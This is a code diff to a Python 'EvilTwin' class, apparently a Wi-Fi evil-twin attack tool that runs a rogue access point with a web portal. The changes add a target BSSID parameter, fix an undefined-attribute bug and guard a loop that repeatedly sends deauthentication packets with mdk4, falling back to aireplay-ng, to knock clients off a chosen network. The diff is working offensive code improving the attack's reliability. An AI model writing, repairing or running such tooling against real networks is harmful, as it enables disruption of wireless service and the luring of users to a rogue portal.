@@ -13,11 +13,12 @@ PORTAL_DIR = Path("/tmp/evil_twin")
 
 
 class EvilTwin:
-    def __init__(self, ap_iface, essid, channel=6, deauth_iface=None):
+    def __init__(self, ap_iface, essid, channel=6, deauth_iface=None, target_bssid=None):
         self.ap_iface = ap_iface
         self.essid = essid
         self.channel = channel
         self.deauth_iface = deauth_iface
+        self.target_bssid = target_bssid
         self.gateway = "10.0.0.1"
         self.port = 80
         self.running = False
@@ -322,12 +323,18 @@ log-dhcp
             self._log(f"[!] Web server error: {e}")
 
     def _deauth_loop(self):
-        """Send deauth packets to target network"""
+        """Send deauth packets to target network (requires USB WiFi adapter)"""
+        if not self.target_bssid:
+            self._log("[!] No target BSSID set - deauth disabled")
+            return
+        if not self.deauth_iface:
+            self._log("[!] No deauth interface - deauth disabled")
+            return
+        self._log("[!] Deauth needs monitor mode - may not work on built-in WiFi (icnss)")
         while self.running:
             try:
-                # Use mdk4 deauth
                 proc = subprocess.Popen(
-                    ["mdk4", self.deauth_iface, "d", "-B", self._target_bssid],
+                    ["mdk4", self.deauth_iface, "d", "-B", self.target_bssid],
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                     text=True
                 )
@@ -339,11 +346,10 @@ log-dhcp
                     proc.kill()
                 time.sleep(2)
             except FileNotFoundError:
-                # Fallback to aireplay-ng
                 try:
                     subprocess.run(
                         ["aireplay-ng", "--deauth", "5",
-                         "-a", self._target_bssid, self.deauth_iface],
+                         "-a", self.target_bssid, self.deauth_iface],
                         capture_output=True, timeout=15
                     )
                 except Exception:
